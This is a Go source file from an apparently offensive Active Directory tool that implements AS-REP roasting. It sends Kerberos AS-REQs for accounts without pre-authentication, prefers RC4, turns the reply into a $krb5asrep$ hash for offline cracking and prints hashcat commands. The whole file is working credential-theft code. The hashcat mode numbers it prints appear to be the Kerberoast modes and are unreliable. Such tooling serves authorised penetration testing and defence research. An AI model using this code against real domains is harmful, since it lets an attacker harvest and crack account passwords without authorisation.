// MIT License
//
// # Copyright (c) 2025 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/jfjallid/gokrb5/v9/iana/etypeID"
	"github.com/jfjallid/gokrb5/v9/messages"
	"github.com/jfjallid/gokrb5/v9/types"
)

var helpASRepRoastOptions = `
    Usage: ` + os.Args[0] + ` --asreproast [options]
    ` + helpConnectionOptions + `
    options:
          --target <principal>    Target principal to AS-REP Roast. Accepts UPN (user@domain),
                                  sAMAccountName (user / computer$), or an SPN (service/host).
                                  Only useful when the underlying account has DONT_REQ_PREAUTH.
          --krb5-conf <file>      Read krb5.conf file and use as config
`

func handleASReperoast(args *userArgs) (err error) {
	if args.username == "" {
		fmt.Println("Must specify a --target to AS-REP Roast")
		myFlags.Usage()
		return
	}
	// Make sure we request a RC4 encrypted session key
	args.c.Config.LibDefaults.DefaultTktEnctypeIDs = []int32{etypeID.RC4_HMAC}

	// Pick the AS-REQ cname's NameType from the target form. AD resolves
	// service SPNs to their owning account before checking DONT_REQ_PREAUTH,
	// so a target of "cifs/host.dom" works the same as "host$" — provided
	// the underlying account actually has pre-auth disabled (which for
	// service / computer accounts is unusual, and their passwords are
	// machine-random, so the roast rarely yields a crackable hash).
	ps := parseSPN(args.username)
	cname := types.NewPrincipalName(ps.nameType, args.username)
	ASReq, err := messages.NewASReqForTGT(strings.ToUpper(args.userDomain), args.c.Config, cname)
	if err != nil {
		return fmt.Errorf("error generating new AS_REQ")
	}
	ASRep, err := args.c.ASExchangeExt(args.c.Credentials.Domain(), ASReq, 0, false)
	if err != nil {
		return fmt.Errorf("Failed to get AS_REP for AS-REP Roast: %s\n", err.Error())
	}

	h, encType, err := extractHashFromASRep(ASRep)
	if err != nil {
		log.Errorln(err)
		return
	}

	fmt.Printf("%s\n", h)
	if !args.quiet {
		switch encType {
		case etypeID.RC4_HMAC:
			fmt.Println("Crack with hashcat -m 13100 <hash.txt> <wordlist.txt>")
		case etypeID.AES128_CTS_HMAC_SHA1_96:
			fmt.Println("Crack with hashcat -m 19600 <hash.txt> <wordlist.txt>")
		case etypeID.AES256_CTS_HMAC_SHA1_96:
			fmt.Println("Crack with hashcat -m 19700 <hash.txt> <wordlist.txt>")
		}
	}

	return
}

func extractHashFromASRep(asRep messages.ASRep) (hash string, encType int32, err error) {
	sb := strings.Builder{}
	encType = asRep.EncPart.EType

	sb.Write([]byte("$krb5asrep$"))
	switch asRep.EncPart.EType {
	case etypeID.RC4_HMAC:
		sb.Write([]byte(strconv.Itoa(int(etypeID.RC4_HMAC)) + "$"))
		sb.Write([]byte(asRep.CName.PrincipalNameString() + "@" + asRep.CRealm + ":"))
		sb.Write([]byte(hex.EncodeToString(asRep.EncPart.Cipher[:16]) + "$"))
		sb.Write([]byte(hex.EncodeToString(asRep.EncPart.Cipher[16:])))
	case etypeID.AES128_CTS_HMAC_SHA1_96:
		length := len(asRep.EncPart.Cipher)
		sb.Write([]byte(strconv.Itoa(int(etypeID.AES128_CTS_HMAC_SHA1_96)) + "$"))
		sb.Write([]byte(asRep.CName.PrincipalNameString() + "@" + asRep.CRealm + ":"))
		sb.Write([]byte(hex.EncodeToString(asRep.EncPart.Cipher[length-12:]) + "$"))
		sb.Write([]byte(hex.EncodeToString(asRep.EncPart.Cipher[:length-12])))
	case etypeID.AES256_CTS_HMAC_SHA1_96:
		length := len(asRep.EncPart.Cipher)
		sb.Write([]byte(strconv.Itoa(int(etypeID.AES256_CTS_HMAC_SHA1_96)) + "$"))
		sb.Write([]byte(asRep.CName.PrincipalNameString() + "@" + asRep.CRealm + ":"))
		sb.Write([]byte(hex.EncodeToString(asRep.EncPart.Cipher[length-12:]) + "$"))
		sb.Write([]byte(hex.EncodeToString(asRep.EncPart.Cipher[:length-12])))
	default:
		err = fmt.Errorf("haven't implemented parsing for encryption type: %d", asRep.EncPart.EType)
		return
	}
	hash = sb.String()
	return
}
